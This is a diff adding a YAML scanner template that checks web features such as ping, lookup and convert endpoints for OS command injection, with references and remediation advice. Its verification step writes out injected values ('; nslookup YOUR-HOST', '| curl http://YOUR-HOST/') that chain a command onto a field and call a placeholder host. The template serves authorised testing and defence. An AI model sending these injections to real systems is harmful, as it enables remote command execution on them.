@@ -1,0 +1,33 @@
+id: os-command-injection-callback
+name: OS command injection through a system call
+description: >
+  A field passed to a shell without sanitisation lets an attacker append their
+  own command. Verification uses an out-of-band callback to a host you control,
+  so no output is needed and nothing is destroyed.
+cves: []
+product: Web application invoking OS commands
+affected: Fields used by ping, DNS lookup, conversion or archive features
+cvss: 9.8
+severity: critical
+tags: [web, rce, command-injection, cwe-78]
+references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+fingerprint:
+  paths: ["/ping", "/lookup", "/convert", "/tools"]
+  signals:
+    - A feature that shells out (network tools, converters, archive handlers)
+  notes: A DNS lookup to a host you control is the least invasive proof.
+links:
+  - name: Injected command reaches the network
+    cve: ""
+    enables: arbitrary command execution as the application user
+    verify: >
+      Append a chained lookup that resolves a host you control (for example
+      '; nslookup YOUR-HOST' or '| curl http://YOUR-HOST/') and watch for the
+      callback. A DNS or HTTP hit proves the shell interpreted your input. Do
+      NOT run anything destructive and do not open a reverse shell.
+remediation: >
+  Avoid the shell entirely (pass argument arrays), and when a command must run,
+  validate the input against a strict allow-list and disable shell interpretation.
